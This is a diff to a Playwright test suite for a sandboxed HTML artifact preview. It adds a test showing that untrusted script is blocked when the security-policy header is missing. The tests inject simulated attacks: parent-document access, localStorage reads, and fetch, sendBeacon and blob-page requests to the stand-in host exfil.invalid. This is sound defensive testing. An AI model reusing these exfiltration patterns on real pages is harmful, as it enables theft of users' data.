@@ -16,12 +16,16 @@ const compiled = ts.transpileModule(
 ).outputText;
 let server: Server;
 let origin: string;
+let servePolicy = true;
 test.beforeEach(async () => {
+  servePolicy = true;
   server = createServer((req, res) => {
     if (req.url === '/api/artifacts/preview') {
       res.writeHead(200, {
         'Content-Type': 'text/html',
-        'Content-Security-Policy': ARTIFACT_PREVIEW_POLICY,
+        ...(servePolicy ? { 'Content-Security-Policy': ARTIFACT_PREVIEW_POLICY } : {}),
+        'Access-Control-Allow-Origin': '*',
+        'Access-Control-Expose-Headers': 'Content-Security-Policy',
       });
       res.end(ARTIFACT_PREVIEW_SHELL);
       return;
@@ -70,8 +74,8 @@ test('HTML supports user interaction while blocking parent access, document and 
       try{top.document.querySelector('#parent').textContent='compromised'}catch{parentBlocked=true}
       try{localStorage.getItem('private-session')}catch{storageBlocked=true}
       fetch('https://exfil.invalid/fetch').catch(()=>{});navigator.sendBeacon('https://exfil.invalid/beacon','sample');
-      top.postMessage({type:'qa-ready',parentBlocked,storageBlocked},'*');
-      document.querySelector('#calc').onclick=()=>{
+      addEventListener('load',()=>top.postMessage({type:'qa-ready',parentBlocked,storageBlocked},'*'),{once:true});
+      document.addEventListener('DOMContentLoaded',()=>{document.querySelector('#calc').onclick=()=>{
         const value=Number(document.querySelector('#hours').value)*150;
         document.querySelector('#result').textContent=value;top.postMessage({type:'qa-result',value},'*');
         if(++calls===2)setTimeout(()=>{
@@ -81,7 +85,7 @@ test('HTML supports user interaction while blocking parent access, document and 
           location.href=URL.createObjectURL(new Blob(['<img src="https://exfil.invalid/blob-image"><script>fetch("https://exfil.invalid/blob-fetch").catch(()=>{})<'+ '/script>'],{type:'text/html'}));
           top.postMessage({type:'qa-attacks-dispatched'},'*');
         },100);
-      };
+      };},{once:true});
       </script>`);
     document.body.append(frame);
   }, compiled);
@@ -104,4 +108,28 @@ test('HTML supports user interaction while blocking parent access, document and 
     'synthetic-parent-secret',
   );
   expect(page.url()).toBe(origin + '/c/synthetic');
+});
+
+test('missing binding headers block untrusted content before handoff', async ({ page }) => {
+  servePolicy = false;
+  await page.goto(origin + '/c/header-check');
+  await page.evaluate((code) => {
+    const exports: Record<string, (source: string, error: string) => string> = {};
+    new Function('exports', code)(exports);
+    addEventListener('message', (event) => {
+      if (event.data === 'untrusted-executed') document.body.dataset.executed = 'yes';
+    });
+    const frame = document.createElement('iframe');
+    frame.sandbox.add('allow-scripts');
+    frame.srcdoc = exports.interactiveHtmlDocument(
+      '<script>top.postMessage("untrusted-executed","*")</script>',
+      'Sichere Vorschau nicht verfügbar.',
+    );
+    document.body.append(frame);
+  }, compiled);
+  await expect.poll(() => page.frames().length).toBe(2);
+  const outer = page.frames().find((frame) => frame !== page.mainFrame())!;
+  await expect(outer.locator('#preview-error')).toHaveText('Sichere Vorschau nicht verfügbar.');
+  await expect(outer.locator('iframe')).not.toBeVisible();
+  expect(await page.locator('body').getAttribute('data-executed')).toBeNull();
 });
